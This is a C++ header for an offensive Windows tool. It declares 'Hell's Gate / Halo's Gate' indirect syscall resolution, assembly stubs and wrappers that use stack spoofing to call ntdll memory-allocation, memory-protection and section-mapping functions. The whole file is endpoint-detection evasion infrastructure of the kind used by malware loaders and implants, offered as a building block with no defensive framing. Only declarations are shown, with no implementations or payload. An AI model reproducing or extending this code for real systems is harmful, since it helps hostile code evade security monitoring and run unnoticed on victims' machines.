#pragma once
#include <cstdint>
#include <windows.h>
#include <winternl.h>

// Hell's Gate / Halo's Gate indirect syscall infrastructure
// SSN + syscall_addr resolved from ntdll bytes, passed via R11/R12

struct SyscallEntry {
    uint32_t ssn;
    void* syscall_addr;     // points to syscall;ret gadget in ntdll
    void* func_addr;        // address of the Nt function in ntdll
    bool resolved;
};

struct SyscallTable {
    SyscallEntry NtAllocateVirtualMemory;
    SyscallEntry NtProtectVirtualMemory;
    SyscallEntry NtWriteVirtualMemory;
    SyscallEntry NtFreeVirtualMemory;
    SyscallEntry NtOpenSection;
    SyscallEntry NtMapViewOfSection;
    SyscallEntry NtUnmapViewOfSection;
    SyscallEntry NtClose;
    SyscallEntry NtQueryInformationProcess;
    SyscallEntry NtOpenFile;
    SyscallEntry NtCreateSection;
    SyscallEntry NtWaitForSingleObject;
};

extern SyscallTable g_syscalls;

// Resolve all SSNs from ntdll using Hell's Gate / Halo's Gate
bool resolve_syscalls();

// ASM stub declarations (defined in syscalls.asm)
extern "C" NTSTATUS SyscallIndirect();
extern "C" NTSTATUS SpoofCallSyscall(
    void* arg1, void* arg2, void* arg3, void* arg4,
    void* arg5, void* arg6, void* arg7, void* arg8,
    void* arg9, void* arg10, void* arg11, void* arg12,
    uint32_t ssn, void* syscall_addr
);

// Convenience wrappers for each Nt function via indirect syscall + stack spoofing
NTSTATUS sc_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

NTSTATUS sc_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

NTSTATUS sc_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG FreeType);

NTSTATUS sc_NtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS sc_NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, ULONG InheritDisposition,
    ULONG AllocationType, ULONG Win32Protect);

NTSTATUS sc_NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

NTSTATUS sc_NtClose(HANDLE Handle);

NTSTATUS sc_NtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess, ULONG OpenOptions);

NTSTATUS sc_NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);

NTSTATUS sc_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);
